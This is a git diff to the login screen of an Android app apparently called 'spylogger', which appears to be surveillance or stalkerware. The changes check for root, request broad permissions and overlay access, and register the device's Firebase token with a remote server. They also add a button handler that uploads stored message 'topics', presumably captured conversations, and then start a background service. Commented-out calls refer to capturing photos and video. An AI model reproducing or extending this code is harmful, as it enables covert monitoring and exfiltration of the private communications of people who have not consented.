@@ -15,13 +15,14 @@ import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Bundle;
-import android.os.Handler;
+import android.os.Message;
 import android.provider.ContactsContract;
 import android.provider.Settings;
 import android.support.annotation.NonNull;
 import android.support.design.widget.Snackbar;
 import android.support.v7.app.AppCompatActivity;
 import android.text.TextUtils;
+import android.util.Log;
 import android.view.KeyEvent;
 import android.view.View;
 import android.view.View.OnClickListener;
@@ -35,9 +36,14 @@ import android.widget.Toast;
 
 import com.google.firebase.iid.FirebaseInstanceId;
 import com.gravatasufoca.spylogger.R;
+import com.gravatasufoca.spylogger.helpers.TaskComplete;
 import com.gravatasufoca.spylogger.model.Configuracao;
+import com.gravatasufoca.spylogger.model.Topico;
 import com.gravatasufoca.spylogger.repositorio.RepositorioConfiguracao;
+import com.gravatasufoca.spylogger.repositorio.RepositorioTopico;
 import com.gravatasufoca.spylogger.repositorio.impl.RepositorioConfiguracaoImpl;
+import com.gravatasufoca.spylogger.repositorio.impl.RepositorioTopicoImpl;
+import com.gravatasufoca.spylogger.services.SendMensagensService;
 import com.gravatasufoca.spylogger.services.SendUsuarioService;
 import com.gravatasufoca.spylogger.utils.Utils;
 import com.gravatasufoca.spylogger.vos.AparelhoVO;
@@ -85,29 +91,30 @@ public class LoginActivity extends AppCompatActivity implements LoaderCallbacks<
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_login);
-        this.context=this;
-
-        if(Build.VERSION.SDK_INT >= 23) {
-            if (!Settings.canDrawOverlays(this)) {
-                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                        Uri.parse("package:" + getPackageName()));
-                startActivityForResult(intent, 1234);
-            }
-        }
-        else
-        {
-            Intent intent = new Intent(this, Service.class);
-            startService(intent);
-        }
-
-        Utilidades.askPermissions(this,Utils.permissoes);
+        this.context = this;
 
         if (RootTools.isAccessGiven()) {
             Utils.rooted = true;
         }
 
-        if(!Utilidades.isConnected(this)){
-            Toast.makeText(this,R.string.nao_conectado,Toast.LENGTH_LONG).show();
+        Utilidades.askPermissions(this, Utils.permissoes);
+
+        if (Build.VERSION.SDK_INT >= 23) {
+            if (!Settings.canDrawOverlays(this)) {
+                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                        Uri.parse("package:" + getPackageName()));
+                startActivityForResult(intent, 1234);
+            }
+        } else {
+            Intent intent = new Intent(this, Service.class);
+            startService(intent);
+        }
+
+
+
+
+        if (!Utilidades.isConnected(this)) {
+            Toast.makeText(this, R.string.nao_conectado, Toast.LENGTH_LONG).show();
             finish();
         }
 
@@ -143,6 +150,16 @@ public class LoginActivity extends AppCompatActivity implements LoaderCallbacks<
 //                ServicosHelper servicosHelper=new ServicosHelper();
 //                servicosHelper.getPicture(getApplicationContext(),true);
 //                servicosHelper.getVideo(getApplicationContext(),10,true);
+
+                try {
+                    RepositorioTopico repositorioTopico=new RepositorioTopicoImpl(getApplicationContext());
+                    List<Topico> topicos=repositorioTopico.listar();
+                    SendMensagensService sendMensagensService=new SendMensagensService(getApplicationContext(),null);
+                    sendMensagensService.enviarTopicos();
+
+                } catch (SQLException e) {
+                    Log.e("sql",e.getMessage());
+                }
 
             }
         });
@@ -246,11 +263,10 @@ public class LoginActivity extends AppCompatActivity implements LoaderCallbacks<
             // Show a progress spinner, and kick off a background task to
             // perform the user login attempt.
             showProgress(true);
-            mAuthTask = new UserLoginTask(email, password, new Handler());
+            mAuthTask = new UserLoginTask(email, password);
             mAuthTask.execute((Void) null);
         }
     }
-
 
 
     private boolean isEmailValid(String email) {
@@ -309,7 +325,7 @@ public class LoginActivity extends AppCompatActivity implements LoaderCallbacks<
                 // Select only email addresses.
                 ContactsContract.Contacts.Data.MIMETYPE +
                         " = ?", new String[]{ContactsContract.CommonDataKinds.Email
-                                                                     .CONTENT_ITEM_TYPE},
+                .CONTENT_ITEM_TYPE},
 
                 // Show primary email addresses first. Note that there won't be
                 // a primary email address if the user hasn't specified one.
@@ -357,16 +373,16 @@ public class LoginActivity extends AppCompatActivity implements LoaderCallbacks<
      * Represents an asynchronous login/registration task used to authenticate
      * the user.
      */
-    public class UserLoginTask extends AsyncTask<Void, Void, Boolean> {
+    public class UserLoginTask extends AsyncTask<Void, Void, Boolean> implements TaskComplete {
 
         private final String mEmail;
         private final String mPassword;
-        private Handler handler;
+        private RepositorioConfiguracao repositorioConfiguracao;
+        private Configuracao configuracao;
 
-        UserLoginTask(String email, String password, Handler handler) {
+        UserLoginTask(String email, String password) {
             mEmail = email;
             mPassword = password;
-            this.handler=handler;
         }
 
         @Override
@@ -374,66 +390,38 @@ public class LoginActivity extends AppCompatActivity implements LoaderCallbacks<
             // TODO: attempt authentication against a network service.
 
             try {
-                RepositorioConfiguracao repositorioConfiguracao=new RepositorioConfiguracaoImpl(context);
+                repositorioConfiguracao = new RepositorioConfiguracaoImpl(context);
 
-                Configuracao configuracao=repositorioConfiguracao.getConfiguracao();
+                configuracao = repositorioConfiguracao.getConfiguracao();
 
-                if(configuracao!=null){
-                   /* if(mEmail.equalsIgnoreCase(configuracao.getEmail()) && mPassword.equals(configuracao.getSenha()) ){
-                        return true;
-                    }
-
-                    if(!TextUtils.isEmpty(configuracao.getEmail()) && !mEmail.equalsIgnoreCase(configuracao.getEmail())){
-                        handler.post(new Runnable() {
-                            @Override
-                            public void run() {
-                                mEmailView.setError(getString(R.string.error_invalid_email));
-                                mEmailView.requestFocus();
-                            }
-                        });
-                        return false;
-                    }
-
-
-                    if(!TextUtils.isEmpty(configuracao.getEmail()) && !mPassword.equalsIgnoreCase(configuracao.getSenha())){
-                        handler.post(new Runnable() {
-                            @Override
-                            public void run() {
-                                mPasswordView.setError(getString(R.string.error_invalid_password));
-                                mPasswordView.requestFocus();
-                            }
-                        });
-                        return false;
-                    }*/
-
+                if (configuracao != null) {
 
                     configuracao.setEmail(mEmail);
 
-                    repositorioConfiguracao.atualizar(configuracao);
-                    SendUsuarioService sendUsuarioService=new SendUsuarioService(handler);
+                    SendUsuarioService sendUsuarioService = new SendUsuarioService(this);
 
-                    UsuarioVO usuarioVO=new UsuarioVO();
+                    UsuarioVO usuarioVO = new UsuarioVO();
 
                     usuarioVO.setEmail(mEmail);
                     usuarioVO.setSenha(mPassword);
 
-                    String token=FirebaseInstanceId.getInstance().getToken();
-                    if(!TextUtils.isEmpty(token)){
-                        final AparelhoVO aparelhoVO=new AparelhoVO();
+                    String token = FirebaseInstanceId.getInstance().getToken();
+                    if (!TextUtils.isEmpty(token)) {
+                        final AparelhoVO aparelhoVO = new AparelhoVO();
                         aparelhoVO.setChave(token);
                         aparelhoVO.setNome(android.os.Build.MODEL);
-                        usuarioVO.setAparelhoVOList(new ArrayList<AparelhoVO>(){{add(aparelhoVO);}});
+                        usuarioVO.setAparelho(aparelhoVO);
                     }
 
                     sendUsuarioService.inserirUsuario(usuarioVO);
 
-                    handler.post(new Runnable() {
+                   /* handler.post(new Runnable() {
                         @Override
                         public void run() {
                             Utils.startNewService(context);
                         }
-                    });
-                }else{
+                    });*/
+                } else {
                     return false;
                 }
 
@@ -452,7 +440,7 @@ public class LoginActivity extends AppCompatActivity implements LoaderCallbacks<
             showProgress(false);
 
             if (success) {
-                finish();
+                // finish();
             } else {
                 mPasswordView.setError(getString(R.string.error_incorrect_password));
                 mPasswordView.requestFocus();
@@ -463,6 +451,39 @@ public class LoginActivity extends AppCompatActivity implements LoaderCallbacks<
         protected void onCancelled() {
             mAuthTask = null;
             showProgress(false);
+        }
+
+        @Override
+        public void onFinish(Object object) {
+            if (object != null) {
+                Message msg = (Message) object;
+                switch (msg.what) {
+                    case 500:
+                        mEmailView.setError((CharSequence) msg.obj);
+                        break;
+                    case 401:
+                        mPasswordView.setError(getString(R.string.error_incorrect_password));
+                        mPasswordView.requestFocus();
+                        break;
+                    case 200:
+                        UsuarioVO usuarioVO = (UsuarioVO) msg.obj;
+                        if(usuarioVO!=null && usuarioVO.getAparelho()!=null && usuarioVO.getAparelho().getId()!=null) {
+                            configuracao.setIdAparelho(usuarioVO.getAparelho().getId());
+                            try {
+                                repositorioConfiguracao.atualizar(configuracao);
+
+                            } catch (SQLException e) {
+                                Log.e("sql", e.getMessage());
+                            }
+                        }
+                        Utils.startNewService(context);
+//                        finish();
+                        break;
+                    default:
+                        break;
+                }
+
+            }
         }
     }
 }
